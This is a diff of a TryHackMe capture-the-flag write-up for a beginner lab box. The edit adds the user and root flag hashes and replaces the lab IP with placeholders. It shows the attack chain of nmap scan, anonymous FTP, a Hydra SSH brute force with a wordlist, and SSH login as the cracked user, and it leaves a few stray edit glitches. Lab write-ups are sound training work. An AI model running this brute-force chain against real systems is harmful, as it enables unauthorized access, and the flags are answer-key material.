@@ -20,19 +20,19 @@ Access this TryHackMe Room clicking <a href="https://tryhackme.com/r/room/brookl
 <p>This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.</p>
 
 > 1.1 - <em>User flag</em><br>
->> <strong>_____</strong><br>
+>> <strong>ee11cbb19052e40b07aac0ca060c23ee</strong><br>
 <p><br></p>
 
 > 1.2 - <em>Root flag</em><br>
->> <strong>_____</strong><br>
+>> <strong>63a9f0ea7bb98050796b649e85481845</strong><br>
 <p><br></p>
 
 
 <pre><code>
-$ sudo nmap -sV -sS 10.10.250.221
+$ sudo nmap -sV -sS [Target]
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-30 03:47 GMT
-Nmap scan report for ip-10-10-250-221.eu-west-1.compute.internal (10.10.250.221)
+Nmap scan report for ip-[Target].eu-west-1.compute.internal ([Target])
 Host is up (0.0010s latency).
 Not shown: 997 closed ports
 PORT   STATE SERVICE VERSION
@@ -47,10 +47,10 @@ Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
 </code></pre>
 
 <pre><code>
-$ ftp 10.10.250.221
-Connected to 10.10.250.221.
+$ ftp [Target]
+Connected to [Target].
 220 (vsFTPd 3.0.3)
-Name (10.10.250.221:root): anonymous
+Name ([Target]1:root): anonymous
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -79,14 +79,14 @@ Jake please change your password. It is too weak and holt will be mad if someone
 </code></pre>
 
 <pre><code>
-$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.250.221
+$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://[Target]
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (http://www.thc.org/thc-hydra) starting at 2024-10-30 03:56:43
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
 [DATA] attacking ssh://10.10.250.221:22/
-[22][ssh] host: 10.10.250.221   login: jake   password: 987654321
+[22][ssh] host: [Target]   login: jake   password: 987654321
 1 of 1 target successfully completed, 1 valid password found
 [WARNING] Writing restore file because 4 final worker threads did not complete until end.
 [ERROR] 4 targets did not resolve or could not be connected
@@ -95,12 +95,12 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2024-10-30 03:57:06
 </code></pre>
 
 <pre><code>
-$ ssh jake@10.10.250.221
-The authenticity of host '10.10.250.221 (10.10.250.221)' can't be established.
+$ ssh jake@1[Target]
+The authenticity of host '[Target] ([Target])' can't be established.
 ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
 Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '10.10.250.221' (ECDSA) to the list of known hosts.
-jake@10.10.250.221's password: 
+Warning: Permanently added '[Target]' (ECDSA) to the list of known hosts.
+jake@[Target]'s password: 
 Last login: Tue May 26 08:56:58 2020
 jake@brookly_nine_nine:~$ s -la
 total 44
